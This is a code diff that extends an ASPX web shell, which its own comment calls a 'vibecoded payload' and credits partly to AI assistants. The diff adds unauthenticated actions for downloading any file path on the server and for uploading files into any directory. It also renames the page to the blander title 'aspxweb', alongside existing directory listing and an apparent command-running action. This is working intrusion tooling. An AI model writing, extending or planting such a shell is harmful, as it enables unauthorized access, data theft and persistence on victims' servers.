@@ -3,7 +3,7 @@
 <!-- <3 @jakobfriedl @claude @glm vibecoded payload -->
 <html>
 <head>
-    <title>Test</title>
+    <title>aspxweb</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 40px; }
         .proof { background: #e8f5e9; padding: 20px; border-left: 4px solid #4caf50; margin: 10px 0; }
@@ -17,6 +17,8 @@
         .cmd-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; margin-bottom: 8px; }
         .cmd-row input[type=text] { flex: 1; min-width: 200px; padding: 8px; font-family: monospace; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; }
         .cmd-row select { padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; }
+        .cmd-row input[type=file] { flex: 1; min-width: 200px; padding: 6px; font-family: monospace;
+                                    font-size: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
         #custom-binary-row { display: none; margin-bottom: 8px; }
         #custom-binary-row input { width: 100%; padding: 8px; font-family: monospace; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
         pre { background: #111; color: #39ff6e; padding: 16px; overflow-x: auto; font-size: 13px; border-radius: 4px; white-space: pre-wrap; word-break: break-all; }
@@ -24,18 +26,70 @@
 </head>
 <body>
     <%
-        string message = "";
+        string message     = "";
         string messageType = "";
-        string output = "";
+        string output      = "";
 
-         System.Collections.Specialized.NameValueCollection input =
+        System.Collections.Specialized.NameValueCollection input =
             (Request.HttpMethod == "POST") ? Request.Form : Request.QueryString;
-        // listing dir, resolved once up front — form and listing both use it
+        // listing dir, resolved once up front — form, listing and upload all use it
         string listDir = input["dir"];
         if (string.IsNullOrEmpty(listDir)) {
             listDir = Server.MapPath(".");
         }
-        if (input["action"] == "runUpdate")
+        string action = input["action"] ?? "";
+
+        // download — stream the raw file as an attachment and abort, the page never renders
+        if (action == "download")
+        {
+            string dlPath = input["file"] ?? "";
+            try
+            {
+                if (dlPath.Length == 0 || !System.IO.File.Exists(dlPath)) {
+                    throw new System.IO.FileNotFoundException("no such file", dlPath);
+                }
+                Response.Clear();
+                Response.ClearHeaders();
+                Response.ContentType = "application/octet-stream";
+                Response.AddHeader("Content-Disposition",
+                    "attachment; filename=\"" + System.IO.Path.GetFileName(dlPath).Replace("\"", "_") + "\"");
+                Response.AddHeader("Content-Length", new System.IO.FileInfo(dlPath).Length.ToString());
+                Response.TransmitFile(dlPath);
+                Response.End();
+            }
+            catch (System.Threading.ThreadAbortException) { throw; }
+            catch (Exception ex)
+            {
+                message     = "Download failed: " + ex.Message;
+                messageType = "error";
+            }
+        }
+
+        // upload — multipart POST, saves the file into listDir, page re-renders with the status
+        if (action == "upload")
+        {
+            try
+            {
+                if (Request.Files.Count == 0) {
+                    throw new Exception("no file part in the request — must be multipart/form-data");
+                }
+                System.Web.HttpPostedFile up = Request.Files[0];
+                if (up.ContentLength == 0) {
+                    throw new Exception("empty file");
+                }
+                string destPath = System.IO.Path.Combine(listDir, System.IO.Path.GetFileName(up.FileName));
+                up.SaveAs(destPath);
+                message     = "Uploaded " + up.ContentLength + " bytes to " + destPath;
+                messageType = "result";
+            }
+            catch (Exception ex)
+            {
+                message     = "Upload failed: " + ex.Message;
+                messageType = "error";
+            }
+        }
+
+        if (action == "runUpdate")
         {
             try
             {
@@ -135,7 +189,7 @@
         <h3>Files in <%= System.Web.HttpUtility.HtmlEncode(listDir) %>:</h3>
         <ul>
         <% foreach (string file in System.IO.Directory.GetFiles(listDir)) { %>
-            <li><%= System.IO.Path.GetFileName(file) %> (<%= new System.IO.FileInfo(file).Length %> bytes)</li>
+            <li><a href="?action=download&amp;file=<%= System.Uri.EscapeDataString(file) %>" target="_blank"><%= System.Web.HttpUtility.HtmlEncode(System.IO.Path.GetFileName(file)) %></a> (<%= new System.IO.FileInfo(file).Length %> bytes)</li>
         <% } %>
         </ul>
         <h3>Subdirectories:</h3>
@@ -158,6 +212,16 @@
         <%
             }
         %>
+
+        <h3>Upload to <%= System.Web.HttpUtility.HtmlEncode(listDir) %>:</h3>
+        <form method="post" enctype="multipart/form-data" id="uploadform">
+            <input type="hidden" name="action" value="upload" />
+            <input type="hidden" name="dir" value="<%= System.Web.HttpUtility.HtmlEncode(listDir) %>" />
+            <div class="cmd-row">
+                <input type="file" name="upfile" required />
+                <button type="submit" class="button" style="padding:8px 20px;font-size:14px;margin:0">Upload</button>
+            </div>
+        </form>
     </div>
 
 
